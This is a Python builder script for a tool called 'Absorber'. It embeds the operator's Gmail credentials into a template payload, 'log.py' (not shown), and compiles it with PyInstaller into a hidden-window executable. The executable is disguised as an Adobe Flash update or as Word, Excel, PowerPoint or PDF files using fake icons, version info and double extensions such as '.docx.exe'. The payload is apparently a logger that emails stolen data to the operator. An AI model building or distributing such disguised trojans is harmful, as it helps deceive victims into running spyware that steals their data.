import os
import sys

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

os.system('cls')
print ('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
print('\n')
os.system('copy Template\log.py .\log.py >nul')
email = input(BLUE + 'Enter your email: ' + END)
passd =  input(BLUE + 'Enter your password: ' + END)

f = open('log.py','r+')
readcontent = f.read()
f.seek(0, 0)
f.write('FRM = ' + "'" + email + "'" + '\n' + 'PAS = ' + "'" + passd + "'" + '\n' + readcontent)
f.close()

os.system('cls')
print ('\n {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fake Word docx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fake Powerpoint pptx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fake Acrobat pdf '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Blank Executable \n'.format(BLUE, WHITE))
header = ('{0}Absorber{1} > {2}'.format(YELLOW, WHITE, END))

choice = input(header)

if choice == '1':
    name = 'abs_Flash.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/adobe.ver -i Icons/flash.ico -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()

elif choice == '2':
    name = 'abs_Word.docx.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/word.ver -i Icons/word.ico -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()    

elif choice == '3':
    name = 'abs_Excel.xlsx.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/excel.ver -i Icons/excel.ico -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()

elif choice == '4':
    name = 'abs_powerpoint.pptx.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/powerpoint.ver -i Icons/powerpoint.ico -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()

elif choice == '5':
    name = 'abs_pdf.pdf.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/pdf.ver -i Icons/pdf.ico -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()

elif choice == '6':
    name = 'absorber.exe'
    os.system('rmdir /S /Q dist 2>nul')
    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest -F log.py')
    os.system('rmdir /S /Q build __pycache__')
    os.system('del log.py log.spec')
    os.rename('dist/log.exe', 'dist/' + name)
    os.system('cls')
    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
    sys.exit()            

else:
	sys.exit(RED + 'Wrong choice.Please enter right choice next time.' + END)